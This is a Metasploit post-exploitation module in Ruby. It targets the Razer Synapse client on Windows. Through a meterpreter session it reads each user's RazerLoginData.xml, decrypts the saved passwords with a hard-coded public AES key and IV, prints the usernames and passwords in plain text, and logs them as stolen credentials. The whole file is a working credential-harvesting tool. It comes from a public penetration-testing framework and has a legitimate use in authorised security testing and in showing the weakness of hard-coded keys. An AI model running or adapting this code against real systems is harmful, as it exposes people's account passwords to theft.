##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::File

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Windows Gather Razer Synapse Password Extraction',
      'Description'    => %q{
          This module will enumerate passwords stored by the Razer Synapse
          client. The encryption key and iv is publicly known. This module
          will not only extract encrypted password but will also decrypt
          password using public key. Affects versions earlier than 1.7.15.
        },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>',
          'Matt Howard "pasv" <themdhoward[at]gmail.com>', #PoC
          'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
        ],
      'References'    =>
        [
          [ 'URL', 'http://www.pentestgeek.com/2013/01/16/hard-coded-encryption-keys-and-more-wordpress-fun/' ],
          [ 'URL', 'https://github.com/pasv/Testing/blob/master/Razer_decode.py' ]
        ],
      'SessionTypes'   => [ 'meterpreter' ],
      'Platform'      => [ 'win' ]
    ))
  end

  def is_base64?(str)
    str.match(/^([A-Za-z0-9+\/]{4})*([A-Za-z0-9+\/]{4}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}==)$/) ? true : false
  end

  # decrypt password
  def decrypt(pass)
    pass = Rex::Text.decode_base64(pass) if is_base64?(pass)
    cipher = OpenSSL::Cipher.new 'aes-256-cbc'
    cipher.decrypt
    cipher.key = "hcxilkqbbhczfeultgbskdmaunivmfuo"
    cipher.iv = "ryojvlzmdalyglrj"

    pass = pass.unpack("m")[0]
    password = cipher.update pass
    password << cipher.final

    password
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      post_reference_name: self.refname,
      session_id: session_db_id,
      origin_type: :session,
      private_data: opts[:password],
      private_type: opts[:type],
      username: opts[:user]
    }

    if opts[:type] == :nonreplayable_hash
      credential_data[:jtr_format] = 'odf-aes-opencl'
    end

    credential_data.merge!(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
    }.merge(service_data)

    create_credential_login(login_data)
  end

  # Loop throuhg config, grab user and pass
  def get_creds(config)
    creds = []

    return nil if !config.include?('<Version>')

    xml = ::Nokogiri::XML(config)
    xml.xpath('//SavedCredentials').each do |node|
      user = node.xpath('Username').text
      pass = node.xpath('Password').text
      type = :password
      begin
        pass = decrypt(pass)
      rescue OpenSSL::Cipher::CipherError
        type = :nonreplayable_hash
      end
      creds << {
        user: user,
        pass: pass,
        type: type
      }
    end

    creds
  end

  def razerzone_ip
    @razerzone_ip ||= Rex::Socket.resolv_to_dotted("www.razerzone.com")
  end

  # main control method
  def run
    grab_user_profiles().each do |user|
      if user['LocalAppData']
        accounts = user['LocalAppData'] + "\\Razer\\Synapse\\Accounts\\RazerLoginData.xml"
        next if not file?(accounts)
        print_status("Config found for user #{user['UserName']}")

        contents = read_file(accounts)

        # read the contents of file
        creds = get_creds(contents)
        unless creds.empty?
          creds.each do |c|
            user = c[:user]
            pass = c[:pass]
            type = c[:type]

            print_good("Found cred: #{user}:#{pass}")
            report_cred(
              ip: razerzone_ip,
              port: 443,
              service_name: 'http',
              user: user,
              password: pass,
              type: type
            )
          end
        end
      end
    end
  end
end
